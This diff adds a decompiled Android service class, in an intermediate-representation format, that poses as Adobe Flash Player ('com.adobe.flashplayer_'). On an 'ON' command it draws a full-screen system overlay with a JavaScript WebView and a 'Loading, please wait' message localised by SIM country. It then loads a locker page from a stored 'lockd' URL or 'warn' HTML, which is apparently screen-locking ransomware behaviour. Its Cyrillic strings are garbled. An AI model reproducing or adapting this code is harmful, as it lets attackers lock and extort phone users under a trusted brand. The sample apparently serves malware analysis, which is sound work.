@@ -1,0 +1,247 @@
+record `com.adobe.flashplayer_.Prefs` @kind class @AccessFlag PUBLIC extends `android.app.Service` @kind class {
+  `android.widget.TextView` `com.adobe.flashplayer_.Prefs.tmp` @AccessFlag ;
+}
+procedure `void` `<init>`(`com.adobe.flashplayer_.Prefs` v17 @kind this, `android.content.Context` v18 @kind object @name `context`, `java.lang.String` v19 @kind object @name `cmd`) @signature `Lcom/adobe/flashplayer_/Prefs;.<init>:(Landroid/content/Context;Ljava/lang/String;)V` @AccessFlag PUBLIC_CONSTRUCTOR {
+    temp;
+    v0;
+    v1;
+    v2;
+    v3;
+    v4;
+    v5;
+    v6;
+    v7;
+    v8;
+    v9;
+    v10;
+    v11;
+    v12;
+    v13;
+    v14;
+    v15;
+    v16;
+
+  #L037714.  call `<init>`(v17) @signature `Landroid/app/Service;.<init>:()V` @kind direct;
+  #L03771a.  v3:= "phone" @kind object;
+  #L03771e.  v0:= v18 @kind object;
+  #L037722.  call temp:= `getSystemService`(v0, v3) @signature `Landroid/content/Context;.getSystemService:(Ljava/lang/String;)Ljava/lang/Object;` @kind virtual;
+  #L037728.  v13:= temp @kind object;
+  #L03772a.  v13:= (`android.telephony.TelephonyManager`) v13 @kind object;
+  #L03772e.  call temp:= `getSimCountryIso`(v13) @signature `Landroid/telephony/TelephonyManager;.getSimCountryIso:()Ljava/lang/String;` @kind virtual;
+  #L037734.  v9:= temp @kind object;
+  #L037736.  v2:= new `android.view.WindowManager$LayoutParams`;
+  #L03773a.  v3:= -1I;
+  #L03773c.  v4:= -1I;
+  #L03773e.  v5:= 2003I;
+  #L037742.  v6:= 262144I;
+  #L037746.  v7:= -3I;
+  #L037748.  call `<init>`(v2, v3, v4, v5, v6, v7) @signature `Landroid/view/WindowManager$LayoutParams;.<init>:(IIIII)V` @kind direct;
+  #L03774e.  v3:= "window" @kind object;
+  #L037752.  v0:= v18 @kind object;
+  #L037756.  call temp:= `getSystemService`(v0, v3) @signature `Landroid/content/Context;.getSystemService:(Ljava/lang/String;)Ljava/lang/Object;` @kind virtual;
+  #L03775c.  v15:= temp @kind object;
+  #L03775e.  v15:= (`android.view.WindowManager`) v15 @kind object;
+  #L037762.  v3:= "layout_inflater" @kind object;
+  #L037766.  v0:= v18 @kind object;
+  #L03776a.  call temp:= `getSystemService`(v0, v3) @signature `Landroid/content/Context;.getSystemService:(Ljava/lang/String;)Ljava/lang/Object;` @kind virtual;
+  #L037770.  v8:= temp @kind object;
+  #L037772.  v8:= (`android.view.LayoutInflater`) v8 @kind object;
+  #L037776.  v3:= 2130903042I;
+  #L03777c.  v4:= 0I;
+  #L03777e.  call temp:= `inflate`(v8, v3, v4) @signature `Landroid/view/LayoutInflater;.inflate:(ILandroid/view/ViewGroup;)Landroid/view/View;` @kind virtual;
+  #L037784.  v11:= temp @kind object;
+  #L037786.  v3:= 2131296261I;
+  #L03778c.  call temp:= `findViewById`(v11, v3) @signature `Landroid/view/View;.findViewById:(I)Landroid/view/View;` @kind virtual;
+  #L037792.  v16:= temp @kind object;
+  #L037794.  v16:= (`android.webkit.WebView`) v16 @kind object;
+  #L037798.  v3:= 2131296258I;
+  #L03779e.  call temp:= `findViewById`(v11, v3) @signature `Landroid/view/View;.findViewById:(I)Landroid/view/View;` @kind virtual;
+  #L0377a4.  v12:= temp @kind object;
+  #L0377a6.  v12:= (`android.widget.TextView`) v12 @kind object;
+  #L0377aa.  v3:= "warn" @kind object;
+  #L0377ae.  v0:= v17 @kind object;
+  #L0377b2.  v1:= v18 @kind object;
+  #L0377b6.  call temp:= `readConfig`(v0, v3, v1) @signature `Lcom/adobe/flashplayer_/Prefs;.readConfig:(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;` @kind direct;
+  #L0377bc.  v14:= temp @kind object;
+  #L0377be.  v0:= v17 @kind object;
+  #L0377c2.  v0.`com.adobe.flashplayer_.Prefs.tmp` @type ^`android.widget.TextView` := v12 @kind object;
+  #L0377c6.  v10:= "Loading, please wait." @kind object;
+  #L0377ca.  v3:= "ru" @kind object;
+  #L0377ce.  call temp:= `contains`(v9, v3) @signature `Ljava/lang/String;.contains:(Ljava/lang/CharSequence;)Z` @kind virtual;
+  #L0377d4.  v3:= temp;
+  #L0377d6.  if v3 == 0 then goto L0377de;
+  #L0377da.  v10:= "��������, ���������� ���������." @kind object;
+  #L0377de.  v3:= "us" @kind object;
+  #L0377e2.  call temp:= `contains`(v9, v3) @signature `Ljava/lang/String;.contains:(Ljava/lang/CharSequence;)Z` @kind virtual;
+  #L0377e8.  v3:= temp;
+  #L0377ea.  if v3 == 0 then goto L0377f2;
+  #L0377ee.  v10:= "Loading, please wait." @kind object;
+  #L0377f2.  v3:= "ua" @kind object;
+  #L0377f6.  call temp:= `contains`(v9, v3) @signature `Ljava/lang/String;.contains:(Ljava/lang/CharSequence;)Z` @kind virtual;
+  #L0377fc.  v3:= temp;
+  #L0377fe.  if v3 == 0 then goto L037806;
+  #L037802.  v10:= "������������, ���� ����� ���������." @kind object;
+  #L037806.  v3:= "de" @kind object;
+  #L03780a.  call temp:= `contains`(v9, v3) @signature `Ljava/lang/String;.contains:(Ljava/lang/CharSequence;)Z` @kind virtual;
+  #L037810.  v3:= temp;
+  #L037812.  if v3 == 0 then goto L03781a;
+  #L037816.  v10:= "Lade, bitte warten." @kind object;
+  #L03781a.  v3:= "by" @kind object;
+  #L03781e.  call temp:= `contains`(v9, v3) @signature `Ljava/lang/String;.contains:(Ljava/lang/CharSequence;)Z` @kind virtual;
+  #L037824.  v3:= temp;
+  #L037826.  if v3 == 0 then goto L03782e;
+  #L03782a.  v10:= "��������, ��� ����� ���������." @kind object;
+  #L03782e.  v3:= "ON" @kind object;
+  #L037832.  v0:= v19 @kind object;
+  #L037836.  call temp:= `contains`(v0, v3) @signature `Ljava/lang/String;.contains:(Ljava/lang/CharSequence;)Z` @kind virtual;
+  #L03783c.  v3:= temp;
+  #L03783e.  if v3 == 0 then goto L0378e4;
+  #L037842.  call `addView`(v15, v11, v2) @signature `Landroid/view/WindowManager;.addView:(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V` @kind interface;
+  #L037848.  call `setText`(v12, v10) @signature `Landroid/widget/TextView;.setText:(Ljava/lang/CharSequence;)V` @kind virtual;
+  #L03784e.  call temp:= `getSettings`(v16) @signature `Landroid/webkit/WebView;.getSettings:()Landroid/webkit/WebSettings;` @kind virtual;
+  #L037854.  v3:= temp @kind object;
+  #L037856.  v4:= 1I;
+  #L037858.  call `setJavaScriptEnabled`(v3, v4) @signature `Landroid/webkit/WebSettings;.setJavaScriptEnabled:(Z)V` @kind virtual;
+  #L03785e.  call temp:= `getSettings`(v16) @signature `Landroid/webkit/WebView;.getSettings:()Landroid/webkit/WebSettings;` @kind virtual;
+  #L037864.  v3:= temp @kind object;
+  #L037866.  v4:= 0I;
+  #L037868.  call `setBuiltInZoomControls`(v3, v4) @signature `Landroid/webkit/WebSettings;.setBuiltInZoomControls:(Z)V` @kind virtual;
+  #L03786e.  call temp:= `getSettings`(v16) @signature `Landroid/webkit/WebView;.getSettings:()Landroid/webkit/WebSettings;` @kind virtual;
+  #L037874.  v3:= temp @kind object;
+  #L037876.  v4:= 0I;
+  #L037878.  call `setLoadWithOverviewMode`(v3, v4) @signature `Landroid/webkit/WebSettings;.setLoadWithOverviewMode:(Z)V` @kind virtual;
+  #L03787e.  v3:= 1I;
+  #L037880.  v0:= v16 @kind object;
+  #L037884.  call `setScrollContainer`(v0, v3) @signature `Landroid/webkit/WebView;.setScrollContainer:(Z)V` @kind virtual;
+  #L03788a.  v3:= new `com.adobe.flashplayer_.Prefs$navW`;
+  #L03788e.  v4:= 0I;
+  #L037890.  v0:= v17 @kind object;
+  #L037894.  call `<init>`(v3, v0, v4) @signature `Lcom/adobe/flashplayer_/Prefs$navW;.<init>:(Lcom/adobe/flashplayer_/Prefs;Lcom/adobe/flashplayer_/Prefs$navW;)V` @kind direct;
+  #L03789a.  v0:= v16 @kind object;
+  #L03789e.  call `setWebViewClient`(v0, v3) @signature `Landroid/webkit/WebView;.setWebViewClient:(Landroid/webkit/WebViewClient;)V` @kind virtual;
+  #L0378a4.  v3:= "nodata" @kind object;
+  #L0378a8.  call temp:= `contains`(v14, v3) @signature `Ljava/lang/String;.contains:(Ljava/lang/CharSequence;)Z` @kind virtual;
+  #L0378ae.  v3:= temp;
+  #L0378b0.  if v3 == 0 then goto L037912;
+  #L0378b4.  call temp:= `isOnline`(v17, v18) @signature `Lcom/adobe/flashplayer_/Prefs;.isOnline:(Landroid/content/Context;)Z` @kind virtual;
+  #L0378ba.  v3:= temp;
+  #L0378bc.  if v3 == 0 then goto L037912;
+  #L0378c0.  v3:= "lockd" @kind object;
+  #L0378c4.  v0:= v17 @kind object;
+  #L0378c8.  v1:= v18 @kind object;
+  #L0378cc.  call temp:= `readConfig`(v0, v3, v1) @signature `Lcom/adobe/flashplayer_/Prefs;.readConfig:(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;` @kind direct;
+  #L0378d2.  v3:= temp @kind object;
+  #L0378d4.  v0:= v16 @kind object;
+  #L0378d8.  call `loadUrl`(v0, v3) @signature `Landroid/webkit/WebView;.loadUrl:(Ljava/lang/String;)V` @kind virtual;
+  #L0378de.  call `stopSelf`(v17) @signature `Lcom/adobe/flashplayer_/Prefs;.stopSelf:()V` @kind virtual;
+  #L0378e4.  v3:= "OFF" @kind object;
+  #L0378e8.  v0:= v19 @kind object;
+  #L0378ec.  call temp:= `contains`(v0, v3) @signature `Ljava/lang/String;.contains:(Ljava/lang/CharSequence;)Z` @kind virtual;
+  #L0378f2.  v3:= temp;
+  #L0378f4.  if v3 == 0 then goto L037910;
+  #L0378f8.  v3:= 8I;
+  #L0378fc.  call `setVisibility`(v11, v3) @signature `Landroid/view/View;.setVisibility:(I)V` @kind virtual;
+  #L037902.  call `stopSelf`(v17) @signature `Lcom/adobe/flashplayer_/Prefs;.stopSelf:()V` @kind virtual;
+  #L037908.  v3:= 0I;
+  #L03790a.  call `exit`(v3) @signature `Ljava/lang/System;.exit:(I)V` @kind static;
+  #L037910.  return @kind void;
+  #L037912.  v3:= "text/html" @kind object;
+  #L037916.  v4:= "utf-8" @kind object;
+  #L03791a.  v0:= v16 @kind object;
+  #L03791e.  call `loadData`(v0, v14, v3, v4) @signature `Landroid/webkit/WebView;.loadData:(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V` @kind virtual;
+  #L037924.  goto L0378de;
+}
+procedure `java.lang.String` `readConfig`(`com.adobe.flashplayer_.Prefs` v7 @kind this, `java.lang.String` v8 @kind object @name `config`, `android.content.Context` v9 @kind object @name `context`) @signature `Lcom/adobe/flashplayer_/Prefs;.readConfig:(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;` @AccessFlag PRIVATE {
+    temp;
+    v0;
+    v1;
+    v2;
+    v3;
+    v4;
+    v5;
+    v6;
+
+  #L037938.  v4:= "nodata" @kind object;
+  #Try_start0.  
+  #L03793c.  call temp:= `openFileInput`(v9, v8) @signature `Landroid/content/Context;.openFileInput:(Ljava/lang/String;)Ljava/io/FileInputStream;` @kind virtual;
+  #L037942.  v1:= temp @kind object;
+  #L037944.  if v1 == 0 then goto L037984;
+  #L037948.  v2:= new `java.io.InputStreamReader`;
+  #L03794c.  call `<init>`(v2, v1) @signature `Ljava/io/InputStreamReader;.<init>:(Ljava/io/InputStream;)V` @kind direct;
+  #L037952.  v0:= new `java.io.BufferedReader`;
+  #L037956.  call `<init>`(v0, v2) @signature `Ljava/io/BufferedReader;.<init>:(Ljava/io/Reader;)V` @kind direct;
+  #L03795c.  v3:= "" @kind object;
+  #L037960.  v5:= new `java.lang.StringBuilder`;
+  #L037964.  call `<init>`(v5) @signature `Ljava/lang/StringBuilder;.<init>:()V` @kind direct;
+  #L03796a.  call temp:= `readLine`(v0) @signature `Ljava/io/BufferedReader;.readLine:()Ljava/lang/String;` @kind virtual;
+  #L037970.  v3:= temp @kind object;
+  #L037972.  if v3 != 0 then goto L037986;
+  #L037976.  call `close`(v1) @signature `Ljava/io/InputStream;.close:()V` @kind virtual;
+  #L03797c.  call temp:= `toString`(v5) @signature `Ljava/lang/StringBuilder;.toString:()Ljava/lang/String;` @kind virtual;
+  #L037982.  v4:= temp @kind object;
+  #L037984.  return v4 @kind object;
+  #L037986.  call temp:= `append`(v5, v3) @signature `Ljava/lang/StringBuilder;.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;` @kind virtual;
+  #Try_end0.  
+  #L03798c.  goto L03796a;
+  #L03798e.  v6:= Exception @type ^`java.io.FileNotFoundException` @kind object;
+  #L037990.  goto L037984;
+  #L037992.  v6:= Exception @type ^`java.io.IOException` @kind object;
+  #L037994.  goto L037984;
+  catch `java.io.FileNotFoundException` @[Try_start0..Try_end0] goto L03798e;
+  catch `java.io.IOException` @[Try_start0..Try_end0] goto L037992;
+}
+procedure `void` `writeConfig`(`com.adobe.flashplayer_.Prefs` v2 @kind this, `java.lang.String` v3 @kind object @name `config`, `java.lang.String` v4 @kind object @name `data`, `android.content.Context` v5 @kind object @name `context`) @signature `Lcom/adobe/flashplayer_/Prefs;.writeConfig:(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V` @AccessFlag PRIVATE {
+    temp;
+    v0;
+    v1;
+
+  #Try_start0.  
+  #L0379b8.  v0:= new `java.io.OutputStreamWriter`;
+  #L0379bc.  v1:= 0I;
+  #L0379be.  call temp:= `openFileOutput`(v5, v3, v1) @signature `Landroid/content/Context;.openFileOutput:(Ljava/lang/String;I)Ljava/io/FileOutputStream;` @kind virtual;
+  #L0379c4.  v1:= temp @kind object;
+  #L0379c6.  call `<init>`(v0, v1) @signature `Ljava/io/OutputStreamWriter;.<init>:(Ljava/io/OutputStream;)V` @kind direct;
+  #L0379cc.  call `write`(v0, v4) @signature `Ljava/io/OutputStreamWriter;.write:(Ljava/lang/String;)V` @kind virtual;
+  #L0379d2.  call `close`(v0) @signature `Ljava/io/OutputStreamWriter;.close:()V` @kind virtual;
+  #Try_end0.  
+  #L0379d8.  return @kind void;
+  #L0379da.  v1:= Exception @type ^`java.io.IOException` @kind object;
+  #L0379dc.  goto L0379d8;
+  catch `java.io.IOException` @[Try_start0..Try_end0] goto L0379da;
+}
+procedure `boolean` `isOnline`(`com.adobe.flashplayer_.Prefs` v3 @kind this, `android.content.Context` v4 @kind object @name `c`) @signature `Lcom/adobe/flashplayer_/Prefs;.isOnline:(Landroid/content/Context;)Z` @AccessFlag PUBLIC {
+    temp;
+    v0;
+    v1;
+    v2;
+
+  #L037a00.  v2:= "connectivity" @kind object;
+  #L037a04.  call temp:= `getSystemService`(v4, v2) @signature `Landroid/content/Context;.getSystemService:(Ljava/lang/String;)Ljava/lang/Object;` @kind virtual;
+  #L037a0a.  v0:= temp @kind object;
+  #L037a0c.  v0:= (`android.net.ConnectivityManager`) v0 @kind object;
+  #L037a10.  call temp:= `getActiveNetworkInfo`(v0) @signature `Landroid/net/ConnectivityManager;.getActiveNetworkInfo:()Landroid/net/NetworkInfo;` @kind virtual;
+  #L037a16.  v1:= temp @kind object;
+  #L037a18.  if v1 == 0 then goto L037a2c;
+  #L037a1c.  call temp:= `isConnectedOrConnecting`(v1) @signature `Landroid/net/NetworkInfo;.isConnectedOrConnecting:()Z` @kind virtual;
+  #L037a22.  v2:= temp;
+  #L037a24.  if v2 == 0 then goto L037a2c;
+  #L037a28.  v2:= 1I;
+  #L037a2a.  return v2;
+  #L037a2c.  v2:= 0I;
+  #L037a2e.  goto L037a2a;
+}
+procedure `android.os.IBinder` `onBind`(`com.adobe.flashplayer_.Prefs` v1 @kind this, `android.content.Intent` v2 @kind object @name `arg0`) @signature `Lcom/adobe/flashplayer_/Prefs;.onBind:(Landroid/content/Intent;)Landroid/os/IBinder;` @AccessFlag PUBLIC {
+    temp;
+    v0;
+
+  #L037a40.  v0:= 0I;
+  #L037a42.  return v0 @kind object;
+}
+procedure `void` `onCreate`(`com.adobe.flashplayer_.Prefs` v1 @kind this, `android.content.Context` v2 @kind object @name `context`, `java.lang.String` v3 @kind object @name `cmd`) @signature `Lcom/adobe/flashplayer_/Prefs;.onCreate:(Landroid/content/Context;Ljava/lang/String;)V` @AccessFlag PUBLIC {
+    temp;
+    v0;
+
+  #L037a54.  v0:= new `com.adobe.flashplayer_.Prefs`;
+  #L037a58.  call `<init>`(v0, v2, v3) @signature `Lcom/adobe/flashplayer_/Prefs;.<init>:(Landroid/content/Context;Ljava/lang/String;)V` @kind direct;
+  #L037a5e.  return @kind void;
+}
